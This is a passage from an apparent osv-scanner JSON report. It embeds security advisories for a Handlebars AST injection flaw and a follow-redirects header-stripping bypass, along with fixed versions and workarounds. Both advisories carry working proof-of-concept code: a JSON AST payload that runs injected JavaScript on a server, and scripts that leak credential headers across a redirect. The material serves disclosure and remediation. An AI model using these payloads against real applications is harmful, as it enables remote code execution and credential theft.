                "markdown": "**Your dependency is vulnerable to [CVE-2026-106446](https://osv.dev/CVE-2026-106446)**.\n\n## [GHSA-8r5x-fm3f-whwj](https://osv.dev/GHSA-8r5x-fm3f-whwj)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e `Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\u003e \n\u003e If an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\u003e \n\u003e Applications that only ever pass template **strings** are not affected.\n\u003e \n\u003e This bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\u003e \n\u003e ## Details\n\u003e \n\u003e The 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\u003e \n\u003e | AST value | Written into generated code as | Compile options needed |\n\u003e | --- | --- | --- |\n\u003e | `Program.blockParams.length` | `container.program(\u003cindex\u003e, data, \u003clength\u003e)` | none (default options) |\n\u003e | `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[\u003cdepth\u003e]` | `stringParams: true` |\n\u003e | A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n\u003e | A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\u003e \n\u003e The first row works with default options. A `Program` with `blockParams: { \"length\": \"\u003cJS expression\u003e\" }` passes validation because:\n\u003e \n\u003e 1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n\u003e 2. the walker skips the string under `length` because it is not an object.\n\u003e \n\u003e The compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\u003e \n\u003e ## Proof of Concept\n\u003e \n\u003e 1. Start a server that compiles request input:\n\u003e \n\u003e ```js\n\u003e import express from \"express\";\n\u003e import Handlebars from \"handlebars\";\n\u003e \n\u003e const app = express();\n\u003e app.use(express.json());\n\u003e \n\u003e app.post(\"/api/render\", (req, res) =\u003e {\n\u003e   const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n\u003e   res.send(template());\n\u003e });\n\u003e \n\u003e app.listen(2123);\n\u003e ```\n\u003e \n\u003e 2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\u003e \n\u003e ```json\n\u003e {\n\u003e   \"text\": {\n\u003e     \"type\": \"Program\",\n\u003e     \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } },\n\u003e     \"body\": [\n\u003e       {\n\u003e         \"type\": \"BlockStatement\",\n\u003e         \"path\": {\n\u003e           \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n\u003e           \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n\u003e           \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n\u003e         },\n\u003e         \"params\": [],\n\u003e         \"program\": {\n\u003e           \"type\": \"Program\",\n\u003e           \"blockParams\": {\n\u003e             \"length\": \"(()=\u003e{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n\u003e           },\n\u003e           \"body\": [],\n\u003e           \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n\u003e         },\n\u003e         \"openStrip\": { \"open\": false, \"close\": false },\n\u003e         \"inverseStrip\": { \"open\": false, \"close\": false },\n\u003e         \"closeStrip\": { \"open\": false, \"close\": false },\n\u003e         \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n\u003e       }\n\u003e     ]\n\u003e   }\n\u003e }\n\u003e ```\n\u003e \n\u003e 3. Send the request:\n\u003e \n\u003e ```sh\n\u003e curl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n\u003e      -H 'Content-Type: application/json' --data-binary @poc.json\n\u003e ```\n\u003e \n\u003e The server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\u003e \n\u003e ```\n\u003e Error: Injected code ran as uid 1000\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e An application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\u003e \n\u003e - **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n\u003e - **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\u003e \n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e - **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n\u003e   ```javascript\n\u003e   if (typeof templateInput !== 'string') {\n\u003e     throw new TypeError('Template must be a string');\n\u003e   }\n\u003e   ```\n\u003e - Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e ### Variant `Program.blockParams`\n\u003e - [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n\u003e - [jmoritzc53 ](https://github.com/jmoritzc53)\n\u003e - [bhaswanthc ](https://github.com/bhaswanthc)\n\u003e - [dinhvaren ](https://github.com/dinhvaren)\n\u003e - [n0tra4e ](https://github.com/n0tra4e) \n\u003e - [PellaML](https://github.com/PellaML)\n\u003e - [kustundag](https://github.com/kustundag)\n\u003e - [kagebunsher](https://github.com/kagebunsher)\n\u003e - [sanmatte](https://github.com/sanmatte)\n\u003e \n\u003e ### Variant `BooleanLiteral|NumberLiteral.value`\n\u003e \n\u003e - [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R\u0026D)\n\u003e - [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n\u003e - [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n\u003e - [vk-can](https://github.com/vk-can)\n\u003e - [shenhuanageshei](https://github.com/shenhuanageshei)\n\u003e - [kustundag](https://github.com/kustundag)\n\u003e - [kagebunsher](https://github.com/kagebunsher)\n\u003e - [ffasterss](https://github.com/ffasterss)\n\u003e \n\u003e ### Variant `PathExpression.depth`\n\u003e \n\u003e - [hibrian827](https://github.com/hibrian827) Team Atlanta\n\u003e - [oss-security-shopify](https://github.com/oss-security-shopify)\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | handlebars | 4.7.9 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | handlebars | 4.7.9 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-8r5x-fm3f-whwj | handlebars | 4.7.10 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-106446\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-106446\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-106446](https://osv.dev/CVE-2026-106446)**.\n\n## [GHSA-8r5x-fm3f-whwj](https://osv.dev/GHSA-8r5x-fm3f-whwj)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e `Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\u003e \n\u003e If an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\u003e \n\u003e Applications that only ever pass template **strings** are not affected.\n\u003e \n\u003e This bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\u003e \n\u003e ## Details\n\u003e \n\u003e The 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\u003e \n\u003e | AST value | Written into generated code as | Compile options needed |\n\u003e | --- | --- | --- |\n\u003e | `Program.blockParams.length` | `container.program(\u003cindex\u003e, data, \u003clength\u003e)` | none (default options) |\n\u003e | `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[\u003cdepth\u003e]` | `stringParams: true` |\n\u003e | A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n\u003e | A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\u003e \n\u003e The first row works with default options. A `Program` with `blockParams: { \"length\": \"\u003cJS expression\u003e\" }` passes validation because:\n\u003e \n\u003e 1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n\u003e 2. the walker skips the string under `length` because it is not an object.\n\u003e \n\u003e The compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\u003e \n\u003e ## Proof of Concept\n\u003e \n\u003e 1. Start a server that compiles request input:\n\u003e \n\u003e ```js\n\u003e import express from \"express\";\n\u003e import Handlebars from \"handlebars\";\n\u003e \n\u003e const app = express();\n\u003e app.use(express.json());\n\u003e \n\u003e app.post(\"/api/render\", (req, res) =\u003e {\n\u003e   const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n\u003e   res.send(template());\n\u003e });\n\u003e \n\u003e app.listen(2123);\n\u003e ```\n\u003e \n\u003e 2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\u003e \n\u003e ```json\n\u003e {\n\u003e   \"text\": {\n\u003e     \"type\": \"Program\",\n\u003e     \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } },\n\u003e     \"body\": [\n\u003e       {\n\u003e         \"type\": \"BlockStatement\",\n\u003e         \"path\": {\n\u003e           \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n\u003e           \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n\u003e           \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n\u003e         },\n\u003e         \"params\": [],\n\u003e         \"program\": {\n\u003e           \"type\": \"Program\",\n\u003e           \"blockParams\": {\n\u003e             \"length\": \"(()=\u003e{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n\u003e           },\n\u003e           \"body\": [],\n\u003e           \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n\u003e         },\n\u003e         \"openStrip\": { \"open\": false, \"close\": false },\n\u003e         \"inverseStrip\": { \"open\": false, \"close\": false },\n\u003e         \"closeStrip\": { \"open\": false, \"close\": false },\n\u003e         \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n\u003e       }\n\u003e     ]\n\u003e   }\n\u003e }\n\u003e ```\n\u003e \n\u003e 3. Send the request:\n\u003e \n\u003e ```sh\n\u003e curl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n\u003e      -H 'Content-Type: application/json' --data-binary @poc.json\n\u003e ```\n\u003e \n\u003e The server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\u003e \n\u003e ```\n\u003e Error: Injected code ran as uid 1000\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e An application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\u003e \n\u003e - **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n\u003e - **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\u003e \n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e - **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n\u003e   ```javascript\n\u003e   if (typeof templateInput !== 'string') {\n\u003e     throw new TypeError('Template must be a string');\n\u003e   }\n\u003e   ```\n\u003e - Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e ### Variant `Program.blockParams`\n\u003e - [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n\u003e - [jmoritzc53 ](https://github.com/jmoritzc53)\n\u003e - [bhaswanthc ](https://github.com/bhaswanthc)\n\u003e - [dinhvaren ](https://github.com/dinhvaren)\n\u003e - [n0tra4e ](https://github.com/n0tra4e) \n\u003e - [PellaML](https://github.com/PellaML)\n\u003e - [kustundag](https://github.com/kustundag)\n\u003e - [kagebunsher](https://github.com/kagebunsher)\n\u003e - [sanmatte](https://github.com/sanmatte)\n\u003e \n\u003e ### Variant `BooleanLiteral|NumberLiteral.value`\n\u003e \n\u003e - [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R\u0026D)\n\u003e - [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n\u003e - [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n\u003e - [vk-can](https://github.com/vk-can)\n\u003e - [shenhuanageshei](https://github.com/shenhuanageshei)\n\u003e - [kustundag](https://github.com/kustundag)\n\u003e - [kagebunsher](https://github.com/kagebunsher)\n\u003e - [ffasterss](https://github.com/ffasterss)\n\u003e \n\u003e ### Variant `PathExpression.depth`\n\u003e \n\u003e - [hibrian827](https://github.com/hibrian827) Team Atlanta\n\u003e - [oss-security-shopify](https://github.com/oss-security-shopify)\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | handlebars | 4.7.9 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | handlebars | 4.7.9 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-8r5x-fm3f-whwj | handlebars | 4.7.10 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-106446\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-106446\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-106446",
              "name": "CVE-2026-106446",
              "properties": {
                "security-severity": "9.8"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-106446: Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)",
                "text": "CVE-2026-106446: Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-111755",
                "GHSA-8r9p-f939-6h3c"
              ],
              "fullDescription": {
                "markdown": "### Summary\nfollow-redirects 1.16.0 introduced the `sensitiveHeaders` option (the fix for CVE-2026-40895 / GHSA-r4q5-vmmm-2653), which lets an application declare extra header names that must be removed when a redirect crosses to a different host or downgrades protocol. The filter is a single case-insensitive regular expression built by concatenating the declared header names into an alternation after passing each through `escapeRegex`. `escapeRegex` escapes only a partial set of metacharacters and leaves `^`, `|`, `[`, `{`, and `}` unescaped. Header names may legitimately contain `^` and `|` (both are valid RFC 9110 token characters that Node accepts and sends), and for a declared name containing either, the generated pattern can never match the intended header. As a result, an application that adopts this option to protect a custom credential header, then follows an attacker-controlled cross-origin redirect, forwards that credential to the attacker with no error or warning, while believing it is protected. The failure is silent: the protection simply does not exist for the affected names. The built-in list (Authorization, Proxy-Authorization, Cookie) contains no metacharacters and is not affected by this defect.\n\n### Details\nThe filter is constructed once, in the `RedirectableRequest` constructor at `index.js:118-120`:\n\n```js\nthis._headerFilter = new RegExp(\"^(?:\" +\n    sensitiveHeaders.concat(options.sensitiveHeaders).map(escapeRegex).join(\"|\") +\n  \")$\", \"i\");\n```\n\n`escapeRegex` at `index.js:703-705`:\n\n```js\nfunction escapeRegex(regex) {\n  return regex.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$\u0026\");   // escapes ] \\ / ( ) * + ? . $  -- NOT ^ | [ { }\n}\n```\n\nThe character class escapes `]`, `\\`, `/`, `(`, `)`, `*`, `+`, `?`, `.`, and `$`. It omits `^`, `|`, `[`, `{`, and `}`. Of these, Node's `http.ClientRequest` accepts `^` and `|` in header names (they are valid `tchar` values under RFC 9110) and rejects `[`, `{`, `}` with `ERR_INVALID_HTTP_TOKEN`, so `^` and `|` are the reachable vectors for a silent credential leak. Separately, although `[`, `{`, `}` cannot appear as live header names, declaring a `sensitiveHeaders` entry that contains one of them injects an unbalanced token into the alternation (for example an unterminated character class), so the filter `RegExp` throws a `SyntaxError` in the `RedirectableRequest` constructor and the request fails to start. That case is a loud request-time crash from the same incomplete-escaping root cause rather than a silent bypass, and the canonical escaper below fixes it as well.\n\nFor a declared sensitive header name containing an unescaped metacharacter, the alternation is broken in a fail-open way:\n\n- A name containing `^`, for example `X-Api^Key`, yields the alternative `X-Api^Key` inside the pattern. The `^` becomes a mid-pattern start-of-string anchor, so the alternative can never match any real header name. `test(\"X-Api^Key\")` returns `false`, and the header is not stripped.\n- A name containing `|`, for example `X-Token|Secret`, is split into two separate alternatives `X-Token` and `Secret`. The real header `X-Token|Secret` is never matched (not stripped), while unrelated headers literally named `X-Token` or `Secret` would be stripped instead.\n\nThe generated filter source, reproduced from the exact library logic, is:\n```\n^(?:Authorization|Proxy-Authorization|Cookie|X-Api^Key|X-Token|Secret|X-Control-Key)$\n```\nDirect matching results against this filter: `X-Api^Key` -\u003e false, `X-Token|Secret` -\u003e false, `X-Control-Key` (normal name) -\u003e true, and the split-off `X-Token` -\u003e true and `Secret` -\u003e true (collateral wrong-stripping). The built-ins Authorization, Proxy-Authorization, Cookie all -\u003e true.\n\nSecondary, related weakness (filter snapshot not refreshed after `beforeRedirect`): the filter is built once at construction and applied at `index.js:490`, which runs before the `beforeRedirect(this._options, ...)` hook and the subsequent `_sanitizeOptions` at `index.js:494-506`. Because the strip happens before the hook and `this._headerFilter` is never rebuilt, any entry a caller adds to `options.sensitiveHeaders` inside `beforeRedirect` is silently ignored. This facet is lower severity: mutating `sensitiveHeaders` inside `beforeRedirect` is not a documented usage of the option (the documented path is the request option), so it is best treated as a hardening item bundled with the escaping fix rather than an independent control bypass. It is included here because both issues undermine the same control and share a remediation.\n\nSuggested remediation: two changes close both facets.\n\n1. Escape the complete set of regular-expression metacharacters:\n```js\nfunction escapeRegex(str) { return str.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$\u0026\"); }\n```\nThis was verified to restore correct matching for all affected names while preserving the built-in matches.\n\n2. Build the filter at strip time, or rebuild it after the `beforeRedirect` hook re-sanitizes options, so entries added inside the hook take effect. For example, replace the cached `this._headerFilter` with a `this._getHeaderFilter()` that constructs the RegExp from the current `this._options.sensitiveHeaders` on each redirect.\n\nAdditionally, since header names have a strict grammar, consider validating each entry of `options.sensitiveHeaders` against the RFC 9110 token character set and throwing an explicit error on invalid names, so misconfiguration fails loudly. Add a unit test asserting that every declared name is actually matched by the generated filter; the current suite only exercises metacharacter-free names (`Sensitive-A`, `x-sensitive-b`), which is why the defect passes CI.\n\nReferences:\n- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n- https://github.com/follow-redirects/follow-redirects/pull/284\n- https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9\n\n### PoC\nEnvironment: Node.js v24.18.0 on Windows 11. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\nFacet 1, metacharacter header names, `leak.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  req.resume();\n  res.writeHead(302, { Location: \"http://127.0.0.1:45902/\" });   // cross-origin (different port)\n  res.end();\n});\nvar collector = http.createServer(function (req, res) {\n  res.end(JSON.stringify(req.headers));                          // attacker-controlled target\n});\nredirector.listen(45901, \"127.0.0.1\", function () {\n  collector.listen(45902, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 45901, path: \"/\",\n      headers: {\n        \"X-Api^Key\":      \"SECRET-LEAKED-1\",     // declared sensitive, name contains ^\n        \"X-Token|Secret\": \"SECRET-LEAKED-2\",     // declared sensitive, name contains |\n        \"X-Control-Key\":  \"SHOULD-BE-STRIPPED\",  // declared sensitive, normal name (control)\n        \"Authorization\":  \"Bearer BUILTIN-CTL\"   // built-in list (control)\n      },\n      sensitiveHeaders: [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; });\n      res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"X-Api^Key      :\", h[\"x-api^key\"] || \"(stripped)\");\n        console.log(\"X-Token|Secret :\", h[\"x-token|secret\"] || \"(stripped)\");\n        console.log(\"X-Control-Key  :\", h[\"x-control-key\"] || \"(stripped - OK)\");\n        console.log(\"Authorization  :\", h[\"authorization\"] || \"(stripped - OK)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0):\n```\nX-Api^Key      : SECRET-LEAKED-1          \u003c- credential LEAKED to redirect target\nX-Token|Secret : SECRET-LEAKED-2          \u003c- credential LEAKED to redirect target\nX-Control-Key  : (stripped - OK)          \u003c- control: option works for normal names\nAuthorization  : (stripped - OK)          \u003c- control: built-in list works\n```\nThe two controls stripping correctly in the same run prove the strip branch executed and only the metacharacter names defeat the filter.\n\nRoot-cause and fix verification (pure regex logic, no network):\n```js\nvar builtin = [\"Authorization\", \"Proxy-Authorization\", \"Cookie\"];\nfunction escCurrent(s) { return s.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$\u0026\"); }         // library's escaper\nfunction escFixed(s)   { return s.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$\u0026\"); }      // canonical escaper\nfunction build(esc, d) { return new RegExp(\"^(?:\" + builtin.concat(d).map(esc).join(\"|\") + \")$\", \"i\"); }\nvar declared = [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"];\nvar cur = build(escCurrent, declared), fix = build(escFixed, declared);\n[\"X-Api^Key\",\"X-Token|Secret\"].forEach(n =\u003e console.log(\"current\", n, cur.test(n)));  // both false\n[\"X-Api^Key\",\"X-Token|Secret\"].forEach(n =\u003e console.log(\"fixed  \", n, fix.test(n)));  // both true\n[\"X-Token\",\"Secret\"].forEach(n =\u003e console.log(\"collateral\", n, cur.test(n)));         // both true (wrong)\n```\nObserved: current filter returns false for both metacharacter names and true for the unrelated `X-Token` and `Secret`; the fixed filter returns true for all declared names and still true for the built-ins.\n\nReachability of the vectors:\n```\nnode -e 'var http=require(\"http\");[\"X-A^B\",\"X-A|B\",\"X-A[B\",\"X-A{B\",\"X-A}B\"].forEach(function(n){try{var r=http.request({host:\"127.0.0.1\",port:1});r.setHeader(n,\"v\");r.destroy();console.log(n,\"ACCEPTED\");}catch(e){console.log(n,\"REJECTED\",e.code);}});'\n```\nObserved: `X-A^B` and `X-A|B` ACCEPTED; `X-A[B`, `X-A{B`, `X-A}B` REJECTED with `ERR_INVALID_HTTP_TOKEN`.\n\nFacet 2, entry declared inside `beforeRedirect`, `leak2.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  res.writeHead(302, { Location: \"http://127.0.0.1:46202/\" }); res.end();\n});\nvar collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\nredirector.listen(46201, \"127.0.0.1\", function () {\n  collector.listen(46202, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 46201, path: \"/\",\n      headers: { \"X-Late\": \"LATE-DECLARED-VALUE\" },\n      beforeRedirect: function (options) { options.sensitiveHeaders.push(\"X-Late\"); }\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n        console.log(\"X-Late forwarded to redirect target:\", JSON.parse(body)[\"x-late\"] || \"(stripped)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0): `X-Late forwarded to redirect target: LATE-DECLARED-VALUE` (the late-declared name is not stripped).\n\n### Impact\nThis is an information-disclosure vulnerability: silent failure of the `sensitiveHeaders` cross-origin stripping control for affected header names. Who is impacted: any application, or upstream library, that adopts the `sensitiveHeaders` option to protect a custom credential-bearing header whose name contains `^` or `|`, and that follows a redirect controlled or compromised by an attacker. When triggered, the declared header value (typically an API token or other bearer credential) is disclosed to the attacker-controlled destination, silently, while the application believes the header is protected. As with the array-form finding, if the redirect downgrades HTTPS to HTTP, the credential also transits in cleartext. Downstream exposure extends beyond the library: any application or wrapper that adopts the `sensitiveHeaders` option and declares a metacharacter-bearing header name inherits the same silent bypass. axios delegates redirect handling to follow-redirects (see GHSA-r4q5-vmmm-2653), so axios-based stacks are affected wherever this option reaches the library. The built-in protected headers are unaffected.",
                "text": "### Summary\nfollow-redirects 1.16.0 introduced the `sensitiveHeaders` option (the fix for CVE-2026-40895 / GHSA-r4q5-vmmm-2653), which lets an application declare extra header names that must be removed when a redirect crosses to a different host or downgrades protocol. The filter is a single case-insensitive regular expression built by concatenating the declared header names into an alternation after passing each through `escapeRegex`. `escapeRegex` escapes only a partial set of metacharacters and leaves `^`, `|`, `[`, `{`, and `}` unescaped. Header names may legitimately contain `^` and `|` (both are valid RFC 9110 token characters that Node accepts and sends), and for a declared name containing either, the generated pattern can never match the intended header. As a result, an application that adopts this option to protect a custom credential header, then follows an attacker-controlled cross-origin redirect, forwards that credential to the attacker with no error or warning, while believing it is protected. The failure is silent: the protection simply does not exist for the affected names. The built-in list (Authorization, Proxy-Authorization, Cookie) contains no metacharacters and is not affected by this defect.\n\n### Details\nThe filter is constructed once, in the `RedirectableRequest` constructor at `index.js:118-120`:\n\n```js\nthis._headerFilter = new RegExp(\"^(?:\" +\n    sensitiveHeaders.concat(options.sensitiveHeaders).map(escapeRegex).join(\"|\") +\n  \")$\", \"i\");\n```\n\n`escapeRegex` at `index.js:703-705`:\n\n```js\nfunction escapeRegex(regex) {\n  return regex.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$\u0026\");   // escapes ] \\ / ( ) * + ? . $  -- NOT ^ | [ { }\n}\n```\n\nThe character class escapes `]`, `\\`, `/`, `(`, `)`, `*`, `+`, `?`, `.`, and `$`. It omits `^`, `|`, `[`, `{`, and `}`. Of these, Node's `http.ClientRequest` accepts `^` and `|` in header names (they are valid `tchar` values under RFC 9110) and rejects `[`, `{`, `}` with `ERR_INVALID_HTTP_TOKEN`, so `^` and `|` are the reachable vectors for a silent credential leak. Separately, although `[`, `{`, `}` cannot appear as live header names, declaring a `sensitiveHeaders` entry that contains one of them injects an unbalanced token into the alternation (for example an unterminated character class), so the filter `RegExp` throws a `SyntaxError` in the `RedirectableRequest` constructor and the request fails to start. That case is a loud request-time crash from the same incomplete-escaping root cause rather than a silent bypass, and the canonical escaper below fixes it as well.\n\nFor a declared sensitive header name containing an unescaped metacharacter, the alternation is broken in a fail-open way:\n\n- A name containing `^`, for example `X-Api^Key`, yields the alternative `X-Api^Key` inside the pattern. The `^` becomes a mid-pattern start-of-string anchor, so the alternative can never match any real header name. `test(\"X-Api^Key\")` returns `false`, and the header is not stripped.\n- A name containing `|`, for example `X-Token|Secret`, is split into two separate alternatives `X-Token` and `Secret`. The real header `X-Token|Secret` is never matched (not stripped), while unrelated headers literally named `X-Token` or `Secret` would be stripped instead.\n\nThe generated filter source, reproduced from the exact library logic, is:\n```\n^(?:Authorization|Proxy-Authorization|Cookie|X-Api^Key|X-Token|Secret|X-Control-Key)$\n```\nDirect matching results against this filter: `X-Api^Key` -\u003e false, 